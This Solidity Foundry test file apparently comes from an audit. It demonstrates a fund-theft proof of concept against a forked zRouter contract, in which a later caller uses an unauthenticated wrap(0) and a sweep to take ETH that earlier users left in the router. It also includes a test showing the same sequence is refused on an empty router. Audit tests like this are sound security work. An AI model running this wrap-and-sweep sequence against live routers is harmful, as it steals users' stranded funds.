// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import { Test } from "forge-std/Test.sol";
import { zRouter, ChainConfig } from "../../../src/peripherals/zRouter.sol";

/// @dev WETH9 as far as these legs touch it: `wrap` moves ETH to it through a raw value call with
///      empty calldata, and `sweep` ERC-20-transfers the resulting balance out.
contract StubWETH {
    mapping(address => uint256) public balanceOf;

    receive() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev Minimal ERC-20: the swap output leg of the victim's chained swap.
contract StubToken {
    function transfer(address, uint256) external pure returns (bool) {
        return true;
    }
}

/// @dev A zAMM that consumes exactly 1 wei of input and reports that as its amountIn, so an exact-out
///      leg paid 1 ETH leaves 1 ether - 1 wei sitting in the router.
contract StubZAMM {
    uint256 internal constant COST = 1 wei;

    fallback() external payable {
        if (msg.value > COST) {
            (bool ok,) = msg.sender.call{ value: msg.value - COST }("");
            require(ok, "refund");
        }
        assembly {
            mstore(0x00, COST)
            return(0x00, 0x20)
        }
    }

    receive() external payable { }
}

/**
 * @title H02_ZRouterResting
 * @notice Claim: value a victim leaves resting in `zRouter` at the end of their own transaction — an
 *         exact-out overpayment with `to == address(this)`, which is how a multicall chains one leg's
 *         output into the next and what strands change when the chain stops early, or a deposit not
 *         fully spent — can be taken by a DIFFERENT caller in a LATER transaction.
 *
 *         The claimant needs no privilege and pays nothing. `wrap(0)` moves the router's ENTIRE ETH
 *         balance into WETH and credits that amount to the router's own transient credit slot, but it
 *         is unauthenticated: the credit it stamps describes whose money this transaction put in only
 *         when the value arrived in this transaction. A caller who sends no `msg.value` still gets
 *         the credit — the ETH merely changed shape inside the router — and `sweep(WETH, ...)` then
 *         honours `_requireOwnBalance` against that credit and ships the VICTIM's balance to an
 *         address the attacker names. The transient model has no way to tell "I wrapped what was
 *         already here" from "I paid this in", so resting ETH is first-come-first-served across
 *         transactions at T4.
 *
 * @dev    Scope: this attacks `src/peripherals/zRouter.sol`, the vendored fork `DeployCore` self-deploys
 *         only on Sepolia and Anvil (`DeploySepolia.s.sol`, `DeployAnvil.s.sol` both leave `cfg.zrouter`
 *         at `address(0)`). Mainnet never deploys it: `DeployMainnet.s.sol` sets
 *         `cfg.zrouter = MainnetAddresses.ZROUTER`, the already-deployed canonical singleton at
 *         `0x000000000000FB114709235f1ccBFfb925F600e4` — infrastructure this project does not own,
 *         did not write, and cannot patch. That contract's own `sweep` (`lib/zRouter/src/zRouter.sol:866`,
 *         the pristine copy its README names as the deployed source) carries no credit check at all:
 *         resting value there is first-come-first-served by design, for every caller, not a defect this
 *         fork introduced or can regress. `_requireOwnBalance` is this fork's own addition on top of
 *         that baseline, and `wrap(0)` is a gap in it, not in the router this protocol actually runs on.
 *         Separately, nothing this protocol's own code calls (`BestRouteAcquirer.sol`) ever leaves value
 *         resting: every call is a single exact-in typed leg with `to == address(this)` (the vault),
 *         never a `multicall`, `deposit`, or `wrap`. The protocol is never the victim this claim needs.
 *         Disposition: confirmed against the fork, accepted-class for mainnet — the fork is testnet-only
 *         plumbing, not a fund-safety issue, and not a bug to report against code this project does not
 *         own.
 */
contract H02ZRouterRestingTest is Test {
    StubWETH internal weth;
    StubToken internal tokenOut;
    StubZAMM internal zamm;
    zRouter internal router;

    address internal owner = address(uint160(0x0FF1CE));
    address internal victim = address(uint160(0x1234));
    address internal attacker = address(uint160(0xBAD1));

    function setUp() public {
        weth = new StubWETH();
        tokenOut = new StubToken();
        zamm = new StubZAMM();

        ChainConfig memory c;
        c.weth = address(weth);
        c.zamm = address(zamm);
        router = new zRouter(c, owner);
    }

    /// THE CLAIM. A victim chains two exact-out legs with `to == address(this)` and the chain stops
    /// after the first: the change from their own overpayment rests in the router at the end of their
    /// transaction (1 ETH in, a 1 wei fill, so 1 ether - 1 wei rests). A later T4 caller who has sent
    /// NOTHING to the router calls `wrap(0)` — which moves no value IN, merely reshapes the router's
    /// own balance into WETH and credits that amount to the caller-spending slot — then `sweep`s the
    /// wrapped token out. The transient credit cannot tell whose wei it is describing.
    function test_Attacker_TakesStrandedChangeThroughWrapCreditAndSweep() public {
        // The victim's own transaction: an exact-out swapVZ into the router itself, paid 1 ether for a
        // 1 wei fill. `to == address(this)` is the chaining shape; here nothing consumes the credit.
        vm.deal(victim, 1 ether);
        vm.prank(victim);
        router.swapVZ{ value: 1 ether }({
            to: address(router),
            exactOut: true,
            feeOrHook: 30,
            tokenIn: address(0),
            tokenOut: address(tokenOut),
            idIn: 0,
            idOut: 0,
            swapAmount: 1,
            amountLimit: 1 ether,
            deadline: block.timestamp + 1
        });

        assertEq(address(router).balance, 1 ether - 1 wei, "the victim's change rests in the router");

        // The attacker, a different T4 caller in a later transaction, with no ETH of their own.
        assertEq(attacker.balance, 0, "the attacker starts with nothing");

        bytes[] memory calls = new bytes[](2);
        calls[0] = abi.encodeCall(zRouter.wrap, (0)); // amount == 0 means "wrap the whole balance"
        calls[1] = abi.encodeCall(zRouter.sweep, (address(weth), 0, 1 ether - 1 wei, attacker));

        vm.prank(attacker);
        router.multicall(calls); // msg.value == 0: the wrap leg costs the attacker nothing

        assertEq(weth.balanceOf(attacker), 1 ether - 1 wei, "the attacker left with the victim's stranded change");
        assertEq(address(router).balance, 0, "and the router holds none of it");
    }

    /// Non-vacuity: the identical `wrap`+`sweep` on an EMPTY router is refused. The attack works only
    /// because a previous transaction left a balance the credit counter cannot tell apart from this
    /// transaction's own staging.
    function test_Defended_SameSequenceOnAnEmptyRouterIsRefused() public {
        assertEq(address(router).balance, 0, "nothing rests in the router");

        bytes[] memory calls = new bytes[](2);
        calls[0] = abi.encodeCall(zRouter.wrap, (0));
        calls[1] = abi.encodeCall(zRouter.sweep, (address(weth), 0, type(uint256).max, attacker));

        vm.prank(attacker);
        vm.expectRevert(zRouter.Unauthorized.selector);
        router.multicall(calls);
    }

    /// The other stranded-value shape named in the claim: a `deposit` not fully used. The victim
    /// deposits 1 ETH and sweeps only half back in their own transaction; the other half rests. The
    /// later T4 caller takes it the same way, for free.
    function test_Attacker_TakesHalfUsedDeposit() public {
        vm.deal(victim, 1 ether);
        bytes[] memory setup = new bytes[](2);
        setup[0] = abi.encodeCall(zRouter.deposit, (address(0), 0, 1 ether));
        setup[1] = abi.encodeCall(zRouter.sweep, (address(0), 0, 0.5 ether, victim));

        vm.prank(victim);
        router.multicall{ value: 1 ether }(setup);

        assertEq(address(router).balance, 0.5 ether, "half the deposit was left behind");

        bytes[] memory calls = new bytes[](2);
        calls[0] = abi.encodeCall(zRouter.wrap, (0));
        calls[1] = abi.encodeCall(zRouter.sweep, (address(weth), 0, 0.5 ether, attacker));

        vm.prank(attacker);
        router.multicall(calls);

        assertEq(weth.balanceOf(attacker), 0.5 ether, "the later caller took the remainder");
        assertEq(address(router).balance, 0, "and nothing is left");
    }
}
